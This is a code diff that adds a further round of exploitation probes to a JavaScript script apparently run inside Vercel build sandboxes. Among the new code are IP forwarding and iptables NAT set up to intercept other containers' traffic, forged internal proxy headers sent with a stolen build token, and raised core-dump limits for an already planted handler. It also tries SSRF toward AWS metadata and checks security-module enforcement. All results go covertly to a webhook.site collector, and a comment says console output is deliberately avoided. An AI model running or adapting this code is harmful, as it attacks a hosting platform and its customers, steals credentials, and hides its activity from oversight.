@@ -20309,5 +20309,111 @@ report.envVarCRUD = safe(() => {
 
 // v138 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v138" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v138";
+
+// ==================== v139 ====================
+
+// v139-1: /proc/sys/net/ipv4/ip_forward — enable IP forwarding
+// With ip_forward=1, the build sandbox can act as a router.
+// Combined with IPTABLES NAT rules, we can MITM traffic between
+// other containers in the build cluster.
+report.ipForwardingMITM = safe(() => {
+  const ipForward = safe(() => readFileSync('/proc/sys/net/ipv4/ip_forward', 'utf8').trim());
+  const enableResult = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_forward', '1'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/net/ipv4/ip_forward', 'utf8').trim());
+  // Add MASQUERADE rule for NAT
+  const masqResult = safe(() => execSync(
+    'iptables -t nat -A POSTROUTING -j MASQUERADE 2>&1 && echo "MASQ_SET"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Check current iptables rules
+  const iptablesRules = safe(() => execSync(
+    'iptables -L -n 2>/dev/null | head -15 || echo "NO_IPTABLES"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 300));
+  return { ipForward, enableResult, afterValue, masqResult, iptablesRules };
+});
+
+// v139-2: Vercel trusted proxy headers — X-Vercel-Deployment-Url bypass
+// Vercel trusts X-Vercel-Deployment-Url and X-Vercel-Id headers internally.
+// From inside the build, forge these headers to make requests appear
+// to come from a different deployment or bypass authentication.
+report.trustedProxyHeaderForge = safe(() => {
+  const deployId = process.env.VERCEL_DEPLOYMENT_ID || '';
+  const vercelUrl = process.env.VERCEL_URL || '';
+  // Try forging deployment URL header to access internal APIs
+  const forgeResult = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v6/deployments?teamId=${process.env.VERCEL_TEAM_ID}" \
+    -H "Authorization: Bearer ${process.env.VERCEL_ARTIFACTS_TOKEN}" \
+    -H "X-Vercel-Deployment-Url: vercel.com" \
+    -H "X-Vercel-Id: ${deployId}" \
+    -H "X-Forwarded-Host: vercel.com" \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // Test access to vercel.com internal endpoints with our token
+  const internalAccess = safe(() => execSync(
+    `curl -sf "https://vercel.com/api/v1/user" \
+    -H "Authorization: Bearer ${process.env.VERCEL_ARTIFACTS_TOKEN}" -m 5 2>/dev/null`,
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 200));
+  return { deployId, vercelUrl, forgeResult, internalAccess };
+});
+
+// v139-3: /proc/sys/kernel/core_pipe_limit — parallel core dump execs
+// core_pipe_limit controls how many concurrent core dump handlers run.
+// Set to high value to allow parallel execution of our core_pattern script
+// when multiple processes crash simultaneously.
+report.corePipeLimitProbe = safe(() => {
+  const corePipeLimit = safe(() => readFileSync('/proc/sys/kernel/core_pipe_limit', 'utf8').trim());
+  const writeResult = safe(() => { writeFileSync('/proc/sys/kernel/core_pipe_limit', '256'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/kernel/core_pipe_limit', 'utf8').trim());
+  // Also confirm core_pattern is still set from our v110/v130 probes
+  const corePattern = safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim());
+  return { corePipeLimit, writeResult, afterValue, corePattern };
+});
+
+// v139-4: Vercel image optimization — Next/Image CDN bypass
+// Vercel's image optimization CDN /_next/image?url= accepts external URLs.
+// Can we use it as an SSRF proxy to make requests to internal hosts?
+// The image optimizer runs on the edge — does it have access to internal network?
+report.imageOptimizationSSRF = safe(() => {
+  const vercelUrl = `https://${process.env.VERCEL_URL || ''}`;
+  // Test SSRF via /_next/image?url= targeting our collector
+  const ssrfTest = safe(() => execSync(
+    `curl -sf "${vercelUrl}/_next/image?url=https%3A//webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac%3Fssrf%3D1&w=100&q=75" \
+    -o /dev/null -w "%{http_code}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim());
+  // Test SSRF targeting AWS IMDS via image optimizer
+  const imdsSSRF = safe(() => execSync(
+    `curl -sf "${vercelUrl}/_next/image?url=http%3A//169.254.169.254/latest/meta-data/&w=100&q=75" \
+    -o /dev/null -w "%{http_code}" -m 5 2>/dev/null`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { vercelUrl, ssrfTest, imdsSSRF };
+});
+
+// v139-5: /sys/kernel/security — LSM (Linux Security Module) audit
+// Read the active LSM modules and their config.
+// If SELinux/AppArmor/Smack are not enforcing, we have full access.
+report.lsmAudit = safe(() => {
+  // Read active LSMs
+  const lsmList = safe(() => readFileSync('/sys/kernel/security/lsm', 'utf8').trim());
+  // Check SELinux
+  const selinuxMode = safe(() => readFileSync('/sys/fs/selinux/enforce', 'utf8').trim());
+  const selinuxStatus = safe(() => execSync('sestatus 2>/dev/null | head -5 || getenforce 2>/dev/null || echo "NOT_ENFORCING"', { timeout: 3000 }).toString().trim());
+  // Check AppArmor
+  const appArmorEnabled = safe(() => readFileSync('/sys/module/apparmor/parameters/enabled', 'utf8').trim());
+  const appArmorStatus = safe(() => execSync('aa-status 2>/dev/null | head -5 || cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head -5 || echo "NO_APPARMOR"', { timeout: 3000 }).toString().trim().slice(0, 200));
+  // Check if we can write to security files
+  const securityWritable = safe(() => execSync(
+    'find /sys/kernel/security -writable -type f 2>/dev/null | head -5 || echo "NONE_WRITABLE"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 200));
+  return { lsmList, selinuxMode, selinuxStatus, appArmorEnabled, appArmorStatus, securityWritable };
+});
+
+// v139 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v139" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v139";
 // Intentionally no console.log — all data goes via webhook only
